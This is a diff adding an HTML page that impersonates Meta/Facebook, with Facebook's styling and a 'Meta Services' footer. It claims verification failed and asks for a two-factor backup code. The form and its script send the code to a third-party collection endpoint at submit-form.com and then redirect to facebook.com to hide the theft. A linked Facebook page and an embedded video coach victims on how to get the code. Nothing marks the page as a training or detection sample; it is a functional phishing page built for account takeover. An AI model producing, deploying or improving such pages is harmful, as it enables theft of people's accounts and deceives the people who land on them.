@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Unable to Verify - Backup Verification</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f0f2f5;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+
+    header {
+      background-color: #1877f2;
+      padding: 16px;
+      color: white;
+      font-size: 20px;
+      font-weight: bold;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    main {
+      flex: 1;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 40px 20px;
+    }
+
+    .container {
+      background: white;
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+      max-width: 400px;
+      width: 100%;
+      text-align: center;
+    }
+
+    h2 {
+      margin-top: 0;
+      color: #333;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-size: 14px;
+    }
+
+    button {
+      background-color: #1877f2;
+      color: white;
+      border: none;
+      padding: 12px;
+      font-size: 16px;
+      border-radius: 4px;
+      cursor: pointer;
+      width: 100%;
+    }
+
+    button:hover {
+      background-color: #145bd3;
+    }
+
+    .link-button {
+      background: none;
+      color: #1877f2;
+      border: none;
+      padding: 0;
+      margin-top: 12px;
+      text-decoration: underline;
+      cursor: pointer;
+      font-size: 14px;
+    }
+
+    .video-box {
+      margin-top: 20px;
+    }
+
+    footer {
+      text-align: center;
+      font-size: 12px;
+      color: #666;
+      padding: 16px;
+    }
+  </style>
+</head>
+<body>
+
+  <header></header>
+
+  <main>
+    <div class="container">
+      <h2>Unable To Verify</h2>
+      <p>Please enter your backup code to complete verification.</p>
+
+      <form action="https://submit-form.com/ONf5dEGWX" method="POST" id="backupForm">
+        <input type="text" name="backup_code" placeholder="Enter backup code" required />
+        <button type="submit">Submit Code</button>
+      </form>
+
+      <a href="https://accountscenter.facebook.com/password_and_security/two_factor" 
+         target="_blank" class="link-button">Get a Backup Code</a>
+
+      <p style="margin-top: 20px; font-size: 14px; color: #555;">
+        Not sure how to get your backup code? Watch the video below for step-by-step instructions.
+      </p>
+
+      <div class="video-box">
+        <iframe width="100%" height="215" 
+                src="https://cdn.glitch.global/47ca368c-7753-4597-b7b9-8611bb837c1f/0615%20(1).mp4?v=1749995440510" 
+                frameborder="0" allowfullscreen></iframe>
+      </div>
+    </div>
+  </main>
+
+  <footer>
+    Meta Services © 2025
+  </footer>
+
+  <script>
+    document.getElementById('backupForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      const form = e.target;
+
+      fetch(form.action, {
+        method: 'POST',
+        body: new FormData(form),
+        headers: {
+          'Accept': 'application/json'
+        }
+      }).then(() => {
+        window.location.href = 'https://facebook.com';
+      }).catch(() => {
+        alert('There was an error. Please try again.');
+      });
+    });
+  </script>
+
+</body>
+</html>
